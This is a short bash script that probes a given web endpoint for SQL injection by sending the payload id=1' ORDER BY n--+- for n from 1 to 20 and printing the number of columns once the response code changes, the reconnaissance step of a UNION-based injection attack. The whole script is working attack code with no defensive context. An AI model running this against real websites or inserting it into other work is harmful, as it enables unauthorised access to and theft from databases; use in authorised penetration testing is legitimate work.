#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

for n in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "${BASE_URL}?id=1' ORDER BY ${n}--+-" --max-time 8)
  if [ "$code" != "200" ]; then
    echo "COLUMNS:$((n-1))"
    break
  fi
done
